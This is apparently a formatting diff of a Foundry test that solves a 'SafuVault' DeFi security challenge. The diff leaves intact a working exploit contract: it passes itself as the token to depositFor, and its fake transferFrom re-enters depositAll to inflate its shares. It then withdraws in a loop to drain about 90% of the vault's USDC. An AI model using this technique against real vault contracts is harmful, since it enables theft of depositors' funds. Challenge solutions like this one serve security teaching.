@@ -7,16 +7,14 @@ import {console} from "forge-std/console.sol";
 // core contracts
 import {Token} from "src/other/Token.sol";
 import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
-import {SafuVault,IStrategy} from "src/safu-vault/SafuVault.sol";
-
+import {SafuVault, IStrategy} from "src/safu-vault/SafuVault.sol";
 
 contract Testing is Test {
-
-    address attacker = makeAddr('attacker');
-    address o1 = makeAddr('o1');
-    address o2 = makeAddr('o2');
-    address admin = makeAddr('admin'); // should not be used
-    address adminUser = makeAddr('adminUser'); // should not be used
+    address attacker = makeAddr("attacker");
+    address o1 = makeAddr("o1");
+    address o2 = makeAddr("o2");
+    address admin = makeAddr("admin"); // should not be used
+    address adminUser = makeAddr("adminUser"); // should not be used
 
     Token usdc;
     SafuVault safuVault;
@@ -24,7 +22,6 @@ contract Testing is Test {
 
     /// preliminary state
     function setUp() public {
-
         // funding accounts
         vm.deal(admin, 10_000 ether);
         vm.deal(attacker, 10_000 ether);
@@ -37,9 +34,11 @@ contract Testing is Test {
         address[] memory addresses = new address[](2);
         uint256[] memory amounts = new uint256[](2);
 
-        addresses[0]=attacker; addresses[1]=adminUser;
-        amounts[0]=10_000e18; amounts[1]=10_000e18;
-        
+        addresses[0] = attacker;
+        addresses[1] = adminUser;
+        amounts[0] = 10_000e18;
+        amounts[1] = 10_000e18;
+
         // attacker gets 10_000 USDC as starting funds
         vm.prank(admin);
         usdc.mintPerUser(addresses, amounts);
@@ -55,15 +54,14 @@ contract Testing is Test {
 
         // other user deposits 10_000 USDC into the safu yield vault
         vm.prank(adminUser);
-        usdc.approve(address(safuVault),type(uint).max);
+        usdc.approve(address(safuVault), type(uint256).max);
         vm.prank(adminUser);
         safuVault.depositAll();
-
     }
 
     /// solves the challenge
     function testChallengeExploit() public {
-        vm.startPrank(attacker,attacker);
+        vm.startPrank(attacker, attacker);
         A a = new A(safuVault, usdc);
         usdc.transfer(address(a), 10_000 ether);
         a.init();
@@ -73,35 +71,32 @@ contract Testing is Test {
 
     /// expected final state
     function validation() public {
-
         // attacker drains >= 90% of funds
-        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault))+usdc.balanceOf(address(safuStrategy));
-        assertLe(totalVaultFunds,1_000e18);
-        assertGe(usdc.balanceOf(attacker),19_000e18);
-
+        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault)) + usdc.balanceOf(address(safuStrategy));
+        assertLe(totalVaultFunds, 1_000e18);
+        assertGe(usdc.balanceOf(attacker), 19_000e18);
     }
-
 }
 
 contract A {
-    SafuVault immutable private safuVault;
-    Token immutable private usdc;
+    SafuVault private immutable safuVault;
+    Token private immutable usdc;
 
-    constructor(SafuVault _safuVault, Token _usdc){
+    constructor(SafuVault _safuVault, Token _usdc) {
         safuVault = _safuVault;
         usdc = _usdc;
-        usdc.approve(address(safuVault), type(uint).max);
+        usdc.approve(address(safuVault), type(uint256).max);
     }
 
     function init() external {
-        for (uint i = 0; i < 4; i++) {
+        for (uint256 i = 0; i < 4; i++) {
             safuVault.depositFor(address(this), 0, address(this));
             safuVault.withdrawAll();
         }
         usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
     }
 
-    function transferFrom(address, address, uint) external returns (bool) {
+    function transferFrom(address, address, uint256) external returns (bool) {
         safuVault.depositAll();
         return true;
     }
